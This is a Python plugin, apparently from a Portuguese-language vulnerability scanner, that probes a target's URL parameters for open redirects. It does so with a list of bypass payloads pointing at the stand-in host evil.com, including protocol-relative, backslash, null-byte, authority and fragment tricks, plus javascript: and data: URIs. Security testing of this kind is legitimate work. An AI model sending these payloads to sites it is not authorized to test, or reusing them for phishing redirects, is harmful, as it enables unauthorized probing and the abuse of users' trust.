# plugins/open_redirect.py
def run(target, ip, open_ports, banners):
    """
    Scanner Open Redirect.
    2026 Intel: header + JS redirect, parser differential bypass,
    protocol-relative, unicode bypass, data: URI, javascript: URI.
    """
    import requests

    params = ["url", "redirect", "next", "return", "goto", "dest", "continue",
              "forward", "return_url", "redirect_uri", "callback", "rurl",
              "target", "out", "redir", "link", "ref"]
    payloads = [
        ("https://evil.com", "DIRECT"),
        ("//evil.com", "PROTOCOL_RELATIVE"),
        ("https://evil.com%2F%2F", "DOUBLE_ENCODE"),
        ("/\\evil.com", "BACKSLASH"),
        ("https://evil.com%00.trusted.com", "NULL_BYTE"),
        ("https://trusted.com@evil.com", "AUTHORITY_BYPASS"),
        ("https://evil.com#trusted.com", "FRAGMENT"),
        ("https://evil.com?.trusted.com", "QUERY_BYPASS"),
        (f"https://{target}.evil.com", "SUBDOMAIN_MATCH"),
        ("javascript:alert(1)", "JAVASCRIPT_URI"),
        ("data:text/html,<h1>Redirect</h1>", "DATA_URI"),
        ("https://evil.com/%2e%2e/", "DOT_ENCODED"),
        ("https:\\\\evil.com", "DOUBLE_BACKSLASH"),
        ("https:evil.com", "SCHEME_COLON"),
    ]
    vulns = []

    for param in params:
        for payload, method in payloads:
            url = f"http://{target}/?{param}={payload}"
            try:
                # Seguir redirect mas capturar cada hop
                resp = requests.get(url, timeout=6, allow_redirects=False)

                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get("Location", "")
                    if "evil.com" in location or location.startswith("javascript:"):
                        sev = "ALTO"
                        if "javascript:" in location:
                            sev = "CRITICO"
                        vulns.append({
                            "tipo": "OPEN_REDIRECT", "metodo": method,
                            "parametro": param, "severidade": sev,
                            "location": location[:100],
                        })
                        break

                # JS redirect detection
                if resp.status_code == 200:
                    if any(pattern in resp.text for pattern in
                           ["window.location", "location.href", "location.replace",
                            "document.location", "window.open"]):
                        if "evil.com" in resp.text:
                            vulns.append({
                                "tipo": "OPEN_REDIRECT_JS", "metodo": method,
                                "parametro": param, "severidade": "ALTO",
                            })
                            break

                # Meta refresh
                if resp.status_code == 200 and "evil.com" in resp.text:
                    if 'http-equiv="refresh"' in resp.text.lower():
                        vulns.append({
                            "tipo": "META_REFRESH_REDIRECT", "metodo": method,
                            "parametro": param, "severidade": "MEDIO",
                        })
                        break

            except Exception:
                continue

    return {"plugin": "open_redirect", "resultados": vulns if vulns else "Nenhum open redirect detectado"}
